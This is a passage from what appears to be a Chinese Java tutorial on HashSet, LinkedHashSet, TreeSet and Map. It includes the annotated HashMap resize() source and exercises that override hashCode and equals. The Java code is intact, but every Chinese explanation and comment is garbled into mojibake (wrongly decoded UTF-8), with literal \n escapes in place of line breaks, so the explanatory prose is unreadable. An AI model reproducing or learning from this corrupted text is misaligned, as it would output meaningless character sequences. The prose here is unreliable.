åº•å±‚æ˜¯ HashMapï¼Œç¬¬ä¸€æ¬¡æ·»åŠ æ—¶ï¼Œtable æ•°ç»„æ‰©å®¹åˆ° 16ï¼Œä¸´ç•Œå€¼ threshold =  16 * loadFactor(åŠ è½½å› å­:0.75) = 12\n  - å¦‚æœ table æ•°ç»„ä½¿ç”¨åˆ°äº†ä¸´ç•Œå€¼ 12ï¼Œå°±ä¼šæ‰©å®¹åˆ° 16 * 2 = 32ï¼Œæ–°çš„ä¸´ç•Œå€¼å°±æ˜¯32*0.75 = 24ï¼Œä¾æ¬¡ç±»æ¨\n\n- åœ¨ Java 8 ä¸­ï¼Œå¦‚æœä¸€æ¡é“¾è¡¨çš„å…ƒç´ ä¸ªæ•°åˆ°è¾¾ TREEIFY_TH RESHOLD(é»˜è®¤æ˜¯8)ï¼Œ\n  å¹¶ä¸” table çš„å¤§å° >= MIN_TREEIFY_CAPACITY(é»˜è®¤64)ï¼Œå°±ä¼šè¿›è¡Œæ ‘åŒ–(çº¢é»‘æ ‘)ï¼Œå¦åˆ™ä»ç„¶é‡‡ç”¨æ•°ç»„æ‰©å®¹æœºåˆ¶\n\n#### æ‰©å®¹æºç \n\n```java\nint threshold;//ä¸´ç•Œå€¼ï¼Œè¯¥æ•°å€¼å†³å®šä»€ä¹ˆæ—¶å€™å¼€å§‹ä¸‹ä¸€æ¬¡æ‰©å®¹\nstatic final int MAXIMUM_CAPACITY = 1 << 30;//å¾ˆå¤§çš„æ•°ï¼ŒåŸºæœ¬ä¸ä¼šç¢°ä¸Š\nstatic final int DEFAULT_INITIAL_CAPACITY = 1 << 4; //16\nstatic final float DEFAULT_LOAD_FACTOR = 0.75f;//è´Ÿè½½å› å­ï¼Œå†³å®šä¸´ç•Œå€¼å¤§å°\n\nfinal Node<K,V>[] resize() {\n    Node<K,V>[] oldTab = table;\n    int oldCap = (oldTab == null) ? 0 : oldTab.length;//è·å¾—tableå¤§å°\n    int oldThr = threshold;//è·å¾—ä¸´ç•Œå€¼ï¼Œæ–°æ•°ç»„åˆ™ä¸º0\n    int newCap, newThr = 0;//æ–°æ•°ç»„å®¹é‡å’Œä¸´ç•Œå€¼\n    if (oldCap > 0) {\n        if (oldCap >= MAXIMUM_CAPACITY) {\n            threshold = Integer.MAX_VALUE;\n            return oldTab;\n        }\n        //åŸæ•°ç»„å¤§å°å¤§äº16æ—¶ï¼Œä¸´ç•Œå€¼è®¾ç½®ä¸ºåŸæ¥çš„ä¸¤å€\n        else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                 oldCap >= DEFAULT_INITIAL_CAPACITY)\n            newThr = oldThr << 1; // double threshold\n    }\n    else if (oldThr > 0)//æ„å‘³ç€è€æ•°ç»„æ²¡æœ‰å…ƒç´ \n        //åˆå§‹å®¹é‡è®¾ç½®ä¸ºä¸´ç•Œå€¼\n        newCap = oldThr;\n    else {\n        //è¯´æ˜æ˜¯è°ƒç”¨æ— å‚æ„é€ å™¨åˆ›å»ºçš„æ—§æ•°ç»„ï¼Œå¹¶ä¸”ç¬¬ä¸€æ¬¡æ·»åŠ å…ƒç´ \n        newCap = DEFAULT_INITIAL_CAPACITY;//16\n        //æ–°ä¸´ç•Œå€¼ = è´Ÿè½½å› å­ * é»˜è®¤å®¹é‡\n        newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);//0.75 * 16\n    }\n    \n    if (newThr == 0) {\n        float ft = (float)newCap * loadFactor;\n        newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                  (int)ft : Integer.MAX_VALUE);\n    }\n    //å°†æ–°ä¸´ç•Œå€¼èµ‹å€¼ç»™ threshold\n    threshold = newThr;\n    @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n    \n    //new ä¸€ä¸ªæ–°çš„ Node æ•°ç»„\n    Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];\n    table = newTab;\n    //åŸæ•°ç»„ä¸ä¸ºç©ºï¼Œè¯´æ˜æ˜¯æ‰©å®¹æ“ä½œï¼Œåˆ™æ¶‰åŠåˆ°å…ƒç´ è½¬ç§»æ“ä½œ\n    if (oldTab != null) {\n        for (int j = 0; j < oldCap; ++j) {\n            Node<K,V> e;\n            //å¦‚æœå½“å‰ä½ç½®å…ƒç´ ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆéœ€è¦è½¬ç§»è¯¥å…ƒç´ åˆ°æ–°æ•°ç»„\n            if ((e = oldTab[j]) != null) {\n                //ç½®ç©º oldTab[j]ï¼Œä¾¿äºè™šæ‹Ÿæœºå›æ”¶\n                oldTab[j] = null;\n                //å¦‚æœ e çš„åç»“ç‚¹ä¸ºç©ºï¼Œåˆ™è®¡ç®— e åœ¨ newTab ä¸­çš„ä½ç½®å¹¶ç½®å…¥\n                if (e.next == null)\n                    //å¦‚æœè¿™ä¸ªoldTab[j]å°±ä¸€ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ”¾åˆ°newTabé‡Œé¢\n                    // æŠŠå…ƒç´ å­˜å‚¨åˆ°æ–°çš„æ•°ç»„ä¸­ï¼Œå­˜å‚¨åˆ°æ•°ç»„çš„å“ªä¸ªä½ç½®éœ€è¦æ ¹æ®hashå€¼å’Œæ•°ç»„é•¿åº¦æ¥è¿›è¡Œå–æ¨¡\n                    // ã€hashå€¼  %  æ•°ç»„é•¿åº¦ã€‘ = ã€ hashå€¼  & ï¼ˆæ•°ç»„é•¿åº¦-1ï¼‰ã€‘\n                    // æ•°ç»„æ‰©å®¹åï¼Œæ‰€æœ‰å…ƒç´ éƒ½éœ€è¦é‡æ–°è®¡ç®—åœ¨æ–°æ•°ç»„ä¸­çš„ä½ç½®ã€‚\n                    newTab[e.hash & (newCap - 1)] = e;\n                //å¦‚æœæ­¤æ—¶ e å·²ç»è½¬ä¸ºçº¢é»‘æ ‘ç»“ç‚¹\n                else if (e instanceof TreeNode)\n                    ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n                else { // e æœ‰åç»“ç‚¹\n                    Node<K,V> loHead = null, loTail = null;\n                    Node<K,V> hiHead = null, hiTail = null;\n                    Node<K,V> next;\n                    do {\n                        next = e.next;\n                        \n                        //é‡ç‚¹éš¾ç‚¹ï¼ï¼ï¼\n                        //ä¸è¿ç®— & æ˜¯ ä¸¤ä¸ªä½éƒ½ä¸º1æ—¶ï¼Œç»“æœæ‰ä¸º1\n                        //(e.hash & oldCap) å¾—åˆ°çš„æ˜¯ å…ƒç´ åœ¨æ•°ç»„ä¸­çš„ä½ç½®æ˜¯å¦éœ€è¦ç§»åŠ¨\n                        // ç¤ºä¾‹1ï¼š\n                        // e.hash=10 0000 1010\n                        // oldCap=16 0001 0000\n                        //   &   =0  0000 0000       æ¯”è¾ƒé«˜ä½çš„ç¬¬ä¸€ä½ 0\n                        //ç»“è®ºï¼šå…ƒç´ ä½ç½®åœ¨æ‰©å®¹åæ•°ç»„ä¸­çš„ä½ç½®æ²¡æœ‰å‘ç”Ÿæ”¹å˜\n                        // ç¤ºä¾‹2ï¼š\n                        // e.hash=17 0001 0001\n                        // oldCap=16 0001 0000\n                        //   &   =1  0001 0000\n                        //ç»“è®ºï¼šå…ƒç´ ä½ç½®åœ¨æ‰©å®¹åæ•°ç»„ä¸­çš„ä½ç½®å‘ç”Ÿäº†æ”¹å˜ï¼Œæ–°çš„ä¸‹æ ‡ä½ç½®æ˜¯åŸä¸‹æ ‡ä½ç½®+åŸæ•°ç»„é•¿åº¦\n\n                        if ((e.hash & oldCap) == 0) {//æ‰©å®¹åä¸éœ€è¦ç§»åŠ¨çš„é“¾è¡¨\n                            if (loTail == null) \n                                loHead = e;\n                            else\n                                loTail.next = e;\n                            loTail = e;\n                        }\n                        else {//æ‰©å®¹åéœ€è¦ç§»åŠ¨çš„é“¾è¡¨\n                            if (hiTail == null)\n                                hiHead = e;\n                            else\n                                hiTail.next = e;\n                            hiTail = e;\n                        }\n                    } while ((e = next) != null);\n                    if (loTail != null) {\n                        loTail.next = null;\n                        newTab[j] = loHead;\n                    }\n                    if (hiTail != null) {\n                        hiTail.next = null;\n                        newTab[j + oldCap] = hiHead;\n                    }\n                }\n            }\n        }\n    }\n    return newTab;\n}\n\n```\n\n### HashSet æ£€æŸ¥é‡å¤\n\næˆ‘ä»¬åªè¦äº†è§£äº† HashSet æ‰§è¡Œæ·»åŠ å…ƒç´ çš„æµç¨‹ï¼Œå°±èƒ½çŸ¥é“ä¸ºä»€ä¹ˆ HashSet èƒ½ä¿è¯å…ƒç´ ä¸é‡å¤äº†ï¼Ÿ\n\nHashSet æ·»åŠ å…ƒç´ çš„æ‰§è¡Œæµç¨‹æ˜¯ï¼šå½“æŠŠå¯¹è±¡åŠ å…¥ HashSet æ—¶ï¼ŒHashSet ä¼šå…ˆè®¡ç®—å¯¹è±¡çš„ hashcode å€¼æ¥åˆ¤æ–­å¯¹è±¡åŠ å…¥çš„ä½ç½®ï¼ŒåŒæ—¶ä¹Ÿä¼šä¸å…¶ä»–åŠ å…¥çš„å¯¹è±¡çš„ hashcode å€¼ä½œæ¯”è¾ƒï¼Œå¦‚æœæ²¡æœ‰ç›¸ç¬¦çš„ hashcodeï¼ŒHashSet ä¼šå‡è®¾å¯¹è±¡æ²¡æœ‰é‡å¤å‡ºç°ï¼Œä¼šå°†å¯¹è±¡æ’å…¥åˆ°ç›¸åº”çš„ä½ç½®ä¸­ã€‚ä½†æ˜¯å¦‚æœå‘ç°æœ‰ç›¸åŒ hashcode å€¼çš„å¯¹è±¡ï¼Œè¿™æ—¶ä¼šè°ƒç”¨å¯¹è±¡çš„ equals() æ–¹æ³•æ¥æ£€æŸ¥å¯¹è±¡æ˜¯å¦çœŸçš„ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œåˆ™ HashSet å°±ä¸ä¼šè®©é‡å¤çš„å¯¹è±¡åŠ å…¥åˆ° HashSet ä¸­ï¼Œè¿™æ ·å°±ä¿è¯äº†å…ƒç´ çš„ä¸é‡å¤ã€‚ \n\n**æ€»ç»“**\n\nHashSet åº•å±‚æ˜¯ç”± HashMap å®ç°çš„ï¼Œå®ƒå¯ä»¥å®ç°é‡å¤å…ƒç´ çš„å»é‡åŠŸèƒ½ï¼Œå¦‚æœå­˜å‚¨çš„æ˜¯è‡ªå®šä¹‰å¯¹è±¡å¿…é¡»é‡å†™ hashCode å’Œ equals æ–¹æ³•ã€‚HashSet ä¿è¯å…ƒç´ ä¸é‡å¤æ˜¯åˆ©ç”¨ HashMap çš„ put æ–¹æ³•å®ç°çš„ï¼Œåœ¨å­˜å‚¨ä¹‹å‰å…ˆæ ¹æ® key çš„ hashCode å’Œ equals åˆ¤æ–­æ˜¯å¦å·²å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±ä¸åœ¨é‡å¤æ’å…¥äº†ï¼Œè¿™æ ·å°±ä¿è¯äº†å…ƒç´ çš„ä¸é‡å¤ã€‚\n\n### ç»ƒä¹ \n\n#### åˆ¤æ–­é¢˜\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\n\npublic class HashSet01 {\n    public static void main(String[] args) {\n        HashSet set = new HashSet();\n        //1. åœ¨æ‰§è¡Œadd æ–¹æ³•åï¼Œä¼šè¿”å›ä¸€ä¸ªboolean å€¼\n        //2. å¦‚æœæ·»åŠ æˆåŠŸï¼Œè¿”å›true, å¦åˆ™è¿”å›false\n        System.out.println(set.add(\"john\"));//T\n        System.out.println(set.add(\"lucy\"));//T\n        System.out.println(set.add(\"john\"));//F\n        System.out.println(set.add(\"jack\"));//T\n        System.out.println(set.add(\"Rose\"));//T\n        //3. å¯ä»¥é€šè¿‡remove æŒ‡å®šåˆ é™¤å“ªä¸ªå¯¹è±¡\n        set.remove(\"john\");\n        System.out.println(\"set=\" + set);//3 ä¸ª\n\n        //4. Hashset ä¸èƒ½æ·»åŠ ç›¸åŒçš„å…ƒç´ /æ•°æ®\n        set.add(\"lucy\");//æ·»åŠ æˆåŠŸ\n        set.add(\"lucy\");//åŠ å…¥ä¸äº†\n        set.add(new Dog(\"tom\"));//OK\n        set.add(new Dog(\"tom\"));//Ok\n        System.out.println(\"set=\" + set);\n\n        set.add(new String(\"jwt\"));//ok\n        set.add(new String(\"jwt\"));//åŠ å…¥ä¸äº†\n        System.out.println(\"set=\" + set);\n    }\n\n}\n\nclass Dog { //å®šä¹‰äº†Dog ç±»\n    private String name;\n    public Dog(String name) {\n        this.name = name;\n    }\n    @Override\n    public String toString() {\n        return \"Dog{\" +\n                \"name='\" + name + '\\'' +\n                '}';\n    }\n}\n```\n\n#### ç¼–ç¨‹é¢˜1\n\nå®šä¹‰ä¸€ä¸ª Employee ç±»ï¼Œè¯¥ç±»åŒ…å«: privateæˆå‘˜å±æ€§name,age è¦æ±‚:\n\n- åˆ›å»º 3 ä¸ª Employee å¯¹è±¡æ”¾å…¥ HashSet ä¸­\n- å½“ name å’Œ age çš„å€¼ç›¸åŒæ—¶ï¼Œè®¤ä¸ºæ˜¯ç›¸åŒå‘˜å·¥ï¼Œä¸èƒ½æ·»åŠ åˆ° HashSet é›†åˆä¸­\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\nimport java.util.Objects;\npublic class HashSetExercise {\n    public static void main(String[] args) {\n        HashSet hashSet = new HashSet();\n        hashSet.add(new Employee(\"milan\", 18));//ok\n        hashSet.add(new Employee(\"smith\", 28));//ok\n        hashSet.add(new Employee(\"milan\", 18));//åŠ å…¥ä¸æˆåŠŸ.\n        System.out.println(\"hashSet=\" + hashSet);\n    }\n}\n\nclass Employee{\n    private String name;\n    private int age;\n\n    public Employee(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nEmployee{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n    //å¦‚æœname å’Œage å€¼ç›¸åŒï¼Œåˆ™è¿”å›ç›¸åŒçš„hash å€¼\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Employee employee = (Employee) o;\n        return age == employee.age && Objects.equals(name, employee.name);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name, age);\n    }\n}\n```\n\n#### ç¼–ç¨‹é¢˜2\n\nå®šä¹‰ä¸€ä¸ªEmployee02ç±»ï¼Œè¯¥ç±»åŒ…å«: private æˆå‘˜å±æ€§nameï¼Œsalï¼Œbirthday(MyDate) ç±» \nå‹)ï¼Œå…¶ä¸­ birthday ä¸º MyDate ç±»å‹(å±æ€§åŒ…æ‹¬: yearï¼Œmonthï¼Œday) è¦æ±‚:\n\n1. åˆ›å»º 3 ä¸ª Employee02 å¯¹è±¡æ”¾å…¥ HashSet ä¸­\n2. å½“ name å’Œ birthday çš„å€¼ç›¸åŒæ—¶ï¼Œè®¤ä¸ºæ˜¯ç›¸åŒå‘˜å·¥ï¼Œä¸èƒ½æ·»åŠ åˆ° HashSet é›†åˆä¸­\n\nè¦ç‚¹ï¼šEmployee02 ç±»å’Œ MyDate ç±»éƒ½è¦é‡å†™ equals å’Œ hashCode æ–¹æ³•ï¼Œå› ä¸ºéƒ½æ˜¯åˆ›å»ºäº†æ–°å¯¹è±¡\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\nimport java.util.Objects;\n\npublic class HashSetExercise02 {\n    public static void main(String[] args) {\n        HashSet<Employee02> hashSet = new HashSet<>();\n        hashSet.add(new Employee02(\"tom\",new MyDate(2000,7,1)));\n        hashSet.add(new Employee02(\"jack\",new MyDate(2001,9,1)));\n        hashSet.add(new Employee02(\"tom\",new MyDate(2000,7,1)));\n        System.out.println(\"hashSet = \" + hashSet);\n    }\n\n}\n\nclass Employee02{\n    private String name;\n    private  MyDate birthday;\n\n    public Employee02(String name, MyDate birthday) {\n        this.name = name;\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nEmployee02{\" +\n                \"name='\" + name + '\\'' +\n                \", birthday=\" + birthday +\n                '}';\n    }\n    //å¦‚æœname å’Œbirthday å€¼ç›¸åŒï¼Œåˆ™è¿”å›ç›¸åŒçš„hash å€¼\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Employee02 that = (Employee02) o;\n        return Objects.equals(name, that.name) && Objects.equals(birthday, that.birthday);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name, birthday);\n    }\n}\n\nclass MyDate{\n    private int year;\n    private int month;\n    private int day;\n\n    public MyDate(int year, int month, int day) {\n        this.year = year;\n        this.month = month;\n        this.day = day;\n    }\n\n    @Override\n    public String toString() {\n        return \"MyDate{\" +\n                \"year=\" + year +\n                \", month=\" + month +\n                \", day=\" + day +\n                '}';\n    }\n    //birthday çš„yearã€monthã€dayç›¸åŒï¼Œåˆ™è¿”å›ç›¸åŒçš„hash å€¼\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        MyDate myDate = (MyDate) o;\n        return year == myDate.year && month == myDate.month && day == myDate.day;\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(year, month, day);\n    }\n}\n```\n\n## 2.2 LinkedHashSet\n\n### ç‰¹ç‚¹\n\n- LinkedHashSet æ˜¯ HashSet çš„å­ç±»\n- LinkedHashSet åº•å±‚æ˜¯ä¸€ä¸ª LinkedHashMapï¼Œåº•å±‚ç»´æŠ¤äº†ä¸€ä¸ªæ•°ç»„+åŒ\n  å‘é“¾è¡¨\n- **æœ‰åºæ€§**ï¼šLinkedHashSet æ ¹æ®å…ƒç´ çš„ hashCode å€¼æ¥å†³å®šå…ƒç´ çš„å­˜å‚¨ä½ç½®ï¼ŒåŒæ—¶ä½¿ç”¨é“¾è¡¨ç»´æŠ¤å…ƒç´ çš„æ¬¡åºï¼Œè¿™ä½¿å¾—å…ƒç´ çœ‹èµ·æ¥æ˜¯ä»¥æ’å…¥é¡ºåºä¿å­˜çš„\n- **ä¸é‡å¤æ€§**ï¼šLinkedHashSet ä¸å…è®¸æ·»é‡å¤å…ƒç´ \n\n![](https://img.jwt1399.top/img/202208232322187.png)\n\næ —å­ğŸŒ°ï¼šCarç±»(å±æ€§:name,price),å¦‚æœ name å’Œ price ä¸€æ ·ï¼Œåˆ™è®¤ä¸ºæ˜¯ç›¸åŒå…ƒç´ ï¼Œå°±ä¸èƒ½æ·»åŠ ã€‚\n\n```java\npackage com.jwt.set_;\n\nimport java.util.LinkedHashSet;\nimport java.util.Objects;\n\npublic class LinkedHashSetExercise {\n    public static void main(String[] args) {\n        LinkedHashSet linkedHashSet = new LinkedHashSet();\n        linkedHashSet.add(new Car(\"å¥¥æ‹“\", 1000));//OK\n        linkedHashSet.add(new Car(\"å¥¥è¿ª\", 300000));//OK\n        linkedHashSet.add(new Car(\"æ³•æ‹‰åˆ©\", 10000000));//OK\n        linkedHashSet.add(new Car(\"å¥¥è¿ª\", 300000));//åŠ å…¥ä¸äº†\n        linkedHashSet.add(new Car(\"ä¿æ—¶æ·\", 70000000));//OK\n        linkedHashSet.add(new Car(\"å¥¥è¿ª\", 300000));//åŠ å…¥ä¸äº†\n        System.out.println(\"linkedHashSet = \" + linkedHashSet);\n    }\n\n}\n\nclass Car{\n    private String name;\n    private double price;\n\n    public Car(String name, double price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nCar{\" +\n                \"name='\" + name + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n    //é‡å†™equalsæ–¹æ³•å’ŒhashCode\n    //å½“name å’Œprice ç›¸åŒæ—¶ï¼Œ å°±è¿”å›ç›¸åŒçš„hashCode å€¼, equals è¿”å›t\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) {\n            return true;\n        }\n        if (o == null || getClass() != o.getClass()) {\n            return false;\n        }\n        Car car = (Car) o;\n        return Double.compare(car.price, price) == 0 && Objects.equals(name, car.name);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name, price);\n    }\n}\n```\n\n## 2.3 TreeSet\n\n- å¯ä»¥æŒ‰ç…§æ·»åŠ å¯¹è±¡æŒ‡å®šå±æ€§è¿›è¡Œæ’åº\n\n- å‘TreeSetä¸­æ·»åŠ çš„æ•°æ®ï¼Œè¦æ±‚æ˜¯ç›¸åŒç±»çš„å¯¹è±¡\n\n```java\nTreeSet set = new TreeSet();\nset.add(456);\nset.add(123);\nset.add(\"AA\");//æŠ¥é”™ï¼Œæ­¤å¤„å‘TreeSetä¸­æ·»åŠ çš„å¿…é¡»æ˜¯åŒä¸€ç±»çš„å¯¹è±¡\n```\n\nä¸¤ç§æ’åºæ–¹å¼ï¼š\n\n- è‡ªç„¶æ’åºï¼ˆå®ç°Comparableæ¥å£ï¼‰\n  - è‡ªç„¶æ’åºä¸­ï¼Œæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰çš„æ ‡å‡†ä¸ºï¼šcompareTo()è¿”å›0ï¼Œä¸å†æ˜¯equals()\n- å®šåˆ¶æ’åºï¼ˆcomparatorï¼‰\n  - å®šåˆ¶æ’åºä¸­ï¼Œæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒçš„æ ‡å‡†ä¸ºï¼šcompare() è¿”å›0ï¼Œè€Œä¸æ˜¯equals()\n\nTreeSet ä¸­æ˜¯é€šè¿‡çº¢é»‘äºŒå‰æ ‘æ¥å®ç°å¯¹æ·»åŠ çš„æ•°æ®è¿›è¡Œå»é‡æ’åºï¼Œå…¶ä¸­æ’åºéœ€è¦ä¸¤ç§æ¯”è¾ƒæ–¹å¼çš„é‡å†™æ¥è§„å®šè¿›è¡Œæ’åºçš„ç±»çš„å±æ€§ã€‚\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Iterator;\nimport java.util.TreeSet;\n\npublic class TreeSet_ {\n    public static void main(String[] args) {\n      \t//é»˜è®¤ä»å°åˆ°å¤§æ’åº\n        TreeSet set = new TreeSet();\n        set.add(34);\n        set.add(-34);\n        set.add(43);\n\t\t\t\t\n        Iterator iterator = set.iterator();\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n}\n```\n\n### è‡ªç„¶æ’åº\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Iterator;\nimport java.util.TreeSet;\n\npublic class TreeSet_ {\n    public static void main(String[] args) {\n\n        TreeSet set = new TreeSet();\n        set.add(new Person(\"Tom\", 12));\n        set.add(new Person(\"Jerry\", 32));\n        set.add(new Person(\"Jim\", 2));\n        set.add(new Person(\"Mike\", 65));\n        set.add(new Person(\"Jack\", 33));\n        set.add(new Person(\"Jack\", 56));\n\n        Iterator iterator = set.iterator();\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n}\n\n\nclass Person implements Comparable{\n    private String name;\n    private int age;\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n\n    @Override\n    public int compareTo(Object o) {\n        if (o instanceof Person) {\n            Person p1 = (Person) o;\n//            return Integer.compare(this.getAge(), p1.getAge());//æŒ‰å¹´é¾„ä»å°åˆ°å¤§\n            return this.name.compareTo(p1.name);//æŒ‰å§“åä»å¤§åˆ°å°\n        } else {\n            throw new RuntimeException(\"è¾“å…¥ç±»å‹ä¸ä¸€è‡´\");\n        }\n    }\n}\n\n```\n\n### å®šåˆ¶æ’åº\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Comparator;\nimport java.util.Iterator;\nimport java.util.TreeSet;\n\npublic class TreeSet_ {\n    public static void main(String[] args) {\n\n        TreeSet set = new TreeSet();\n\n        //é€šè¿‡å®šåˆ¶æ’åºå®ç°å¹´é¾„ä»å°åˆ°å¤§çš„é¡ºåº\n        Comparator com=new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                if (o1 instanceof Person && o2 instanceof Person) {\n                    Person p1 = (Person) o1;\n                    Person p2 = (Person) o2;\n                    return Integer.compare(p1.getAge(), p2.getAge());\n                } else {\n                    throw new RuntimeException(\"è¾“å…¥ç±»å‹ä¸ä¸€è‡´\");\n                }\n\n            }\n        };\n        \n        TreeSet set2 = new TreeSet(com);\n        set2.add(new Person(\"Tom\", 12));\n        set2.add(new Person(\"Jerry\", 32));\n        set2.add(new Person(\"Jim\", 2));\n        set2.add(new Person(\"Mike\", 65));\n        set2.add(new Person(\"Jack\", 33));\n       \n        Iterator iterator = set2.iterator();\n\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n}\n\nclass Person{\n    private String name;\n    private int age;\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n```\n\n## äºŒã€Map\n\n### ç‰¹ç‚¹\n\n1) Map ç”¨äºä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»çš„æ•°æ®ï¼šKey-Valueï¼ˆåŒåˆ—å…ƒç´ ï¼‰\n2) Map ä¸­çš„ key å’Œ value å¯ä»¥æ˜¯ä»»ä½•å¼•ç”¨ç±»å‹çš„æ•°æ®ï¼Œä¼šå°è£…åˆ°HashMap$Node å¯¹è±¡ä¸­\n3) Map ä¸­çš„ key ä¸å…è®¸é‡å¤ï¼ŒåŸå› å’Œ HashSet ä¸€æ ·ï¼Œå‰é¢åˆ†æè¿‡æºç ï¼Œå½“å½“æœ‰ç›¸åŒçš„kï¼Œåæ·»åŠ çš„ value ä¼šè¦†ç›–ä¹‹å‰çš„ï¼Œç›¸å½“äºæ›¿æ¢\n\n```java\nMap map = new HashMap();\nmap.put(\"no1\", \"å°æ˜\");//k-v\nmap.put(\"no1\", \"å°çº¢\");//å½“æœ‰ç›¸åŒçš„k,å°±ç­‰ä»·äºæ›¿æ¢\n//è¾“å‡º:{no1=å°çº¢}\n```\n\n4. Map ä¸­çš„ value å¯ä»¥é‡å¤\n\n```java\nmap.put(\"no1\", \"å°æ˜\");\nmap.put(\"no2\", \"å°æ˜\");\n//è¾“å‡º:{no2=å°æ˜, no1=å°æ˜}\n```\n\n5. Map çš„ key å¯ä»¥ä¸º null, value ä¹Ÿå¯ä»¥ä¸ºnull \n   1. ä½†æ˜¯ key ä¸º nullï¼Œåªèƒ½æœ‰ä¸€ä¸ª\n   2. value ä¸º null å¯ä»¥æœ‰å¤šä¸ª\n   3. å¸¸ç”¨ String ç±»ä½œä¸º Map çš„ key\n\n```java\nmap.put(null, \"abc\"); //ok\nmap.put(\"no4\", null); //ok\nmap.put(null, \"abcd\"); //ä¼šè¦†ç›–abc\nmap.put(\"no5\", null);//ok\n//è¾“å‡ºï¼š{null=abcd,, no4=null, no5=null}\n```\n\n6. key å’Œ value ä¹‹é—´å­˜åœ¨å•å‘å¯¹ä¸€å…³ç³»ï¼Œå³é€šè¿‡æŒ‡å®šçš„ key æ€»èƒ½æ‰¾åˆ°å¯¹åº”çš„ value\n\n```java\nSystem.out.println(map.get(\"no1\"));//å°æ˜\n```\n\n7. Map æ¥å£çš„å¸¸ç”¨å®ç°ç±»ï¼šHashMapã€Hashtableã€TreeMapã€LinkedHashMapã€Properties\n\n### å¸¸ç”¨æ–¹æ³•\n\n- put() æ·»åŠ æ˜ å°„å…³ç³»\n- remove() æ ¹æ®é”®åˆ é™¤æ˜ å°„å…³ç³»\n- get() æ ¹æ®é”®è·å–å€¼\n- size() è·å–å…ƒç´ ä¸ªæ•°\n- isEmpty() åˆ¤æ–­ä¸ªæ•°æ˜¯å¦ä¸º0\n- containsKey() æŸ¥æ‰¾é”®æ˜¯å¦å­˜åœ¨\n- clear() æ¸…é™¤æ˜ å°„å…³ç³»\n- getOrDefault(key, defaultValue) è·å–æŒ‡å®š key å¯¹åº”å¯¹ valueï¼Œå¦‚æœæ‰¾ä¸åˆ° key ï¼Œåˆ™è¿”å›è®¾ç½®çš„é»˜è®¤å€¼ã€‚\n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class MapMethod {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        //put:æ·»åŠ æ˜ å°„å…³ç³»\n        map.put(\"no1\", \"å°æ˜\");//OK\n        map.put(\"no2\", \"å°çº¢\");//OK\n        System.out.println(\"map=\" + map);\n        // remove:æ ¹æ®é”®åˆ é™¤æ˜ å°„å…³ç³»\n        map.remove(\"no2\");\n        System.out.println(\"map=\" + map);\n        // getï¼šæ ¹æ®é”®è·å–å€¼\n        Object val = map.get(\"no1\");\n        System.out.println(\"val=\" + val);\n        // size:è·å–å…ƒç´ ä¸ªæ•°\n        System.out.println(\"k-v=\" + map.size());\n        // isEmpty:åˆ¤æ–­ä¸ªæ•°æ˜¯å¦ä¸º0\n        System.out.println(map.isEmpty());//F\n        // containsKey:æŸ¥æ‰¾é”®æ˜¯å¦å­˜åœ¨\n        System.out.println(\"ç»“æœ=\" + map.containsKey(\"no1\"));//T\n        // clear:æ¸…é™¤k-v\n        map.clear();\n        System.out.println(\"map = \" + map);\n    }\n}\n\n/*\nmap={no2=å°çº¢, no1=å°æ˜}\nmap={no1=å°æ˜}\nval=å°æ˜\nk-v=1\nfalse\nç»“æœ=true\nmap = {}\n*/\n```\n\n### 